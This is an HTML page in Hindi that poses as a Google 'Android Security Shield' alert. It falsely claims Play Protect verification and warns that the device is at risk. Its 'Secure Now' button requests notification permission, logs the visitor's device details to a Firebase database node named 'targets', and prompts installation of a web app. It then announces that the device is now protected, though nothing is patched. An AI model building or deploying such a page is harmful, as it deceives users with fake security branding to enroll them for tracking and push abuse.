<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Security Shield</title>
    <link rel="manifest" href="manifest.json">
    
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-messaging-compat.js"></script>

    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid #1a73e8; }
        .shield-icon { width: 70px; margin-bottom: 15px; }
        h2 { color: #202124; font-size: 20px; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .main-btn { background: #1a73e8; color: white; border: none; padding: 15px 0; width: 100%; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.3); }
        .main-btn:active { transform: scale(0.98); }
        .trust-footer { margin-top: 20px; font-size: 11px; color: #9aa0a6; display: flex; align-items: center; justify-content: center; gap: 5px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png" class="shield-icon" alt="Shield">
    <h2>सिस्टम सुरक्षा अलर्ट</h2>
    <p>आपका डिवाइस खतरे में हो सकता है। सुरक्षा पैच अपडेट करने और रीयल-टाइम प्रोटेक्शन चालू करने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
    
    <button class="main-btn" id="masterButton">अभी सुरक्षित करें (Secure Now)</button>

    <div class="trust-footer">
        <img src="https://www.gstatic.com/images/branding/product/1x/play_protect_32dp.png" width="15"> 
        Google Play Protect द्वारा सत्यापित
    </div>
</div>

<script>
    // Firebase Configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCFpmW9ZvsFai6vc3-GosZxY0TU7ORmEqU",
      authDomain: "rajavideo-f0804.firebaseapp.com",
      databaseURL: "https://rajavideo-f0804-default-rtdb.firebaseio.com",
      projectId: "rajavideo-f0804",
      messagingSenderId: "1000952755183",
      appId: "1:1000952755183:web:96aba391983d11315bfc1a"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let deferredPrompt;
    const masterButton = document.getElementById('masterButton');

    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
    });

    masterButton.addEventListener('click', async () => {
        // 1. Permission मांगना
        const permission = await Notification.requestPermission();
        
        if (permission === "granted") {
            // 2. डेटाबेस में यूजर का डेटा भेजना
            database.ref('targets').push({
                device: navigator.userAgent,
                time: new Date().toLocaleString(),
                status: "Active"
            });

            // 3. आइकन इंस्टॉल करना
            if (deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt = null;
            }

            masterButton.innerText = "सुरक्षा सक्रिय है (Active)";
            masterButton.style.background = "#34a853";
            alert("बधाई हो! आपका डिवाइस अब सुरक्षित है।");
            
        } else {
            alert("सुरक्षा के लिए नोटिफिकेशन की अनुमति ज़रूरी है।");
        }
    });
</script>

</body>
</html>
